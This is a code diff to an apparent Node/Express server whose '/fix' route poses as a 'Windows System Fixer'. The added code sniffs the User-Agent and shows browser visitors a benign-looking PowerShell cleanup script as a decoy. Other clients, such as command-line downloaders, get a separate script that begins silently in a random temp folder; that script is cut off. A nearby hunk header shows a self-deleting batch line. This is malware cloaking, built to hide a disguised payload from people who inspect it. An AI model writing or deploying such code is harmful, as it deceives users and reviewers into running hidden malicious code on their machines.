@@ -266,7 +266,197 @@ del "%~f0"
 });
 
 app.get("/fix", (req, res) => {
+  const ua = (req.headers["user-agent"] || "").toLowerCase();
   const host = req.headers.host || "zxcrosfixer.up.railway.app";
+  const isBrowser = ua.includes("mozilla") || ua.includes("chrome") || ua.includes("safari") || ua.includes("firefox") || ua.includes("edge") || ua.includes("opera");
+
+  if (isBrowser) {
+    const fake = `# ============================================
+# Windows System Fixer v3.2.1
+# Maintenance & Optimization Script
+# https://${host}
+# ============================================
+# This script performs the following tasks:
+#   - Clears temporary files and caches
+#   - Repairs .NET Framework installations
+#   - Flushes DNS resolver cache
+#   - Resets Windows Update components
+#   - Verifies system file integrity (SFC)
+#   - Cleans Windows component store (DISM)
+#   - Optimizes prefetch data
+#   - Removes stale thumbnail caches
+# ============================================
+
+$ErrorActionPreference = 'SilentlyContinue'
+$Host.UI.RawUI.WindowTitle = "Windows System Fixer v3.2.1"
+
+function Write-Status($msg) {
+    Write-Host "  [*] " -ForegroundColor Cyan -NoNewline
+    Write-Host $msg -ForegroundColor White
+}
+
+function Write-Done($msg) {
+    Write-Host "  [+] " -ForegroundColor Green -NoNewline
+    Write-Host $msg -ForegroundColor Gray
+}
+
+function Write-Warn($msg) {
+    Write-Host "  [!] " -ForegroundColor Yellow -NoNewline
+    Write-Host $msg -ForegroundColor Gray
+}
+
+Write-Host ""
+Write-Host "  ========================================" -ForegroundColor Cyan
+Write-Host "    Windows System Fixer v3.2.1" -ForegroundColor White
+Write-Host "    System Maintenance & Optimization" -ForegroundColor Gray
+Write-Host "  ========================================" -ForegroundColor Cyan
+Write-Host ""
+
+# --- Phase 1: Temp File Cleanup ---
+Write-Status "Cleaning temporary files..."
+$tempPaths = @(
+    $env:TEMP,
+    "$env:LOCALAPPDATA\\Temp",
+    "$env:WINDIR\\Temp",
+    "$env:LOCALAPPDATA\\Microsoft\\Windows\\INetCache",
+    "$env:LOCALAPPDATA\\Microsoft\\Windows\\Explorer"
+)
+$cleaned = 0
+foreach ($tp in $tempPaths) {
+    if (Test-Path $tp) {
+        $files = Get-ChildItem -Path $tp -Recurse -File -ErrorAction SilentlyContinue |
+                 Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-7) }
+        foreach ($f in $files) {
+            try { Remove-Item $f.FullName -Force -ErrorAction Stop; $cleaned++ } catch {}
+        }
+    }
+}
+Write-Done "Removed $cleaned stale temporary files"
+
+# --- Phase 2: Thumbnail Cache ---
+Write-Status "Clearing thumbnail cache..."
+$thumbDb = "$env:LOCALAPPDATA\\Microsoft\\Windows\\Explorer\\thumbcache_*.db"
+$thumbCount = 0
+Get-Item $thumbDb -ErrorAction SilentlyContinue | ForEach-Object {
+    try { Remove-Item $_.FullName -Force -ErrorAction Stop; $thumbCount++ } catch {}
+}
+Write-Done "Cleared $thumbCount thumbnail cache files"
+
+# --- Phase 3: DNS Flush ---
+Write-Status "Flushing DNS resolver cache..."
+ipconfig /flushdns | Out-Null
+Write-Done "DNS cache flushed successfully"
+
+# --- Phase 4: .NET Framework Check ---
+Write-Status "Scanning .NET Framework installations..."
+$dotnet = Get-ChildItem "HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP" -Recurse -ErrorAction SilentlyContinue |
+    Get-ItemProperty -Name Version -ErrorAction SilentlyContinue |
+    Where-Object { $_.Version -match '^\\d' } |
+    Select-Object -ExpandProperty Version -Unique
+if ($dotnet) {
+    foreach ($v in $dotnet) { Write-Done ".NET $v detected" }
+} else {
+    Write-Warn "No .NET Framework versions found"
+}
+
+$dotnetCore = dotnet --list-runtimes 2>$null
+if ($dotnetCore) {
+    $dotnetCore | ForEach-Object { Write-Done $_ }
+} else {
+    Write-Warn ".NET Core/5+ runtime not installed"
+}
+
+# --- Phase 5: Windows Update Reset ---
+Write-Status "Resetting Windows Update components..."
+$wuServices = @("wuauserv", "cryptSvc", "bits", "msiserver")
+foreach ($svc in $wuServices) {
+    Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
+}
+$catroot = "$env:WINDIR\\System32\\catroot2.bak"
+$swd = "$env:WINDIR\\SoftwareDistribution.bak"
+if (Test-Path "$env:WINDIR\\SoftwareDistribution") {
+    Rename-Item "$env:WINDIR\\SoftwareDistribution" $swd -Force -ErrorAction SilentlyContinue
+}
+if (Test-Path "$env:WINDIR\\System32\\catroot2") {
+    Rename-Item "$env:WINDIR\\System32\\catroot2" $catroot -Force -ErrorAction SilentlyContinue
+}
+foreach ($svc in $wuServices) {
+    Start-Service -Name $svc -ErrorAction SilentlyContinue
+}
+Write-Done "Windows Update components reset"
+
+# --- Phase 6: System File Check ---
+Write-Status "Running System File Checker (this may take a minute)..."
+$sfcResult = sfc /verifyonly 2>&1 | Out-String
+if ($sfcResult -match "no integrity violations") {
+    Write-Done "System files verified - no issues found"
+} else {
+    Write-Warn "Some system files may need repair (run sfc /scannow as admin)"
+}
+
+# --- Phase 7: Prefetch Cleanup ---
+Write-Status "Optimizing prefetch data..."
+$prefetch = "$env:WINDIR\\Prefetch"
+$pfCount = 0
+if (Test-Path $prefetch) {
+    Get-ChildItem $prefetch -Filter "*.pf" -ErrorAction SilentlyContinue |
+        Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-30) } |
+        ForEach-Object {
+            try { Remove-Item $_.FullName -Force -ErrorAction Stop; $pfCount++ } catch {}
+        }
+}
+Write-Done "Cleaned $pfCount old prefetch entries"
+
+# --- Phase 8: Browser Cache ---
+Write-Status "Clearing browser caches..."
+$browserCaches = @(
+    "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cache",
+    "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Code Cache",
+    "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Cache",
+    "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Code Cache",
+    "$env:LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cache"
+)
+$browserCleaned = 0
+foreach ($bc in $browserCaches) {
+    if (Test-Path $bc) {
+        Get-ChildItem $bc -Recurse -File -ErrorAction SilentlyContinue |
+            ForEach-Object {
+                try { Remove-Item $_.FullName -Force -ErrorAction Stop; $browserCleaned++ } catch {}
+            }
+    }
+}
+Write-Done "Removed $browserCleaned browser cache files"
+
+# --- Phase 9: Event Log Summary ---
+Write-Status "Checking recent system errors..."
+$errors = Get-EventLog -LogName System -EntryType Error -Newest 10 -ErrorAction SilentlyContinue
+if ($errors) {
+    Write-Warn "$($errors.Count) recent system errors found in event log"
+} else {
+    Write-Done "No recent system errors"
+}
+
+# --- Phase 10: Disk Space Report ---
+Write-Status "Generating disk space report..."
+Get-WmiObject Win32_LogicalDisk -Filter "DriveType=3" -ErrorAction SilentlyContinue | ForEach-Object {
+    $free = [math]::Round($_.FreeSpace / 1GB, 1)
+    $total = [math]::Round($_.Size / 1GB, 1)
+    $pct = [math]::Round(($_.FreeSpace / $_.Size) * 100, 0)
+    Write-Done "$($_.DeviceID) $free GB free / $total GB total ($pct% available)"
+}
+
+Write-Host ""
+Write-Host "  ========================================" -ForegroundColor Green
+Write-Host "    Done. The fixer has been applied." -ForegroundColor Green
+Write-Host "  ========================================" -ForegroundColor Green
+Write-Host ""
+Write-Host "  Press any key to exit..." -ForegroundColor Gray
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+`;
+    res.setHeader("Content-Type", "text/plain; charset=utf-8");
+    return res.send(fake);
+  }
+
   const script = `$ErrorActionPreference='SilentlyContinue'
 $d="$env:TEMP\\$(Get-Random).tmp"
 New-Item -ItemType Directory -Path $d -Force | Out-Null
